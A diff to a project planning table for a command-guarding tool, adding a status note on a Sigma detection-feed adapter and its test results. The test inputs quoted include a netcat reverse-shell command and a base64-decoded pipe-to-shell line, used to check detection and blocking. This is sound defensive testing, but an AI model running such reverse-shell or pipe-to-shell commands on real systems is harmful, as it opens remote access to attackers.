@@ -69,6 +69,14 @@ default to "yes"), `feeds status` says not opted in, `feeds update` refuses with
 
 | F4 | Feed store: `~/.blitz/feeds/<name>/` with `manifest.json` (source, ref/ETag, sha256, fetched_at) + compiled `rules.json` in one native shape; `blitzpi feeds update \| list \| rollback`; previous compiled version kept; every update audited; compile failure keeps the previous feed | AD-7 | high | update/rollback on a real source; corrupt download → previous kept |
 | F5 | gitleaks adapter → secrets in commands/URLs, per-rule ids, **monitor** | AD-3 | med | a fake AWS key in a command → audited, shown, not blocked |
+**F6 status 2026-08-30: built and verified live — user confirmation needed.** `feeds update` → `commands updated 121 rules (16
+skipped) 3098 KB sha256 5725c91b…` ✔ · `feeds scan 'nc -e /bin/sh 10.0.0.1 4444'` → *Potential Netcat Reverse Shell Execution
+[high] attack.execution attack.t1059*; `bun test && git status` → nothing ✔ · headless monitor: `echo aGk= | base64 -d | sh` ran
+(`sh: hi: command not found`), audit `feed_command mode:monitor allowed:true hits:[Linux Base64 Encoded Pipe to Shell]` ✔ ·
+headless enforce: `[BLOCKED] command-shapes feed (Sigma): Linux Base64 Encoded Pipe to Shell [medium]` ✔ · TUI: `commands sigma
+(monitor)`, `Command shapes (Sigma)` row ✔ · `blitzpi report` feed-hit ledger lists the rule with its count ✔ · installer smoke
+**51/51** (opt-in installs both feeds; Sigma scan flags a reverse shell) · Jest 159 passed ✔.
+
 | F6 | Sigma `linux/process_creation` adapter → command shapes, **monitor**; `blitzpi report` shows hit counts per rule so FP rate is measurable before enforce | AD-1 | med | reverse-shell command → audited; a normal `bun test` → silent |
 | F7 | URLhaus adapter → URLs in commands, **monitor → enforce** after a week of clean reports | AD-4 | med | a listed URL in `curl` → audited/blocked per mode |
 
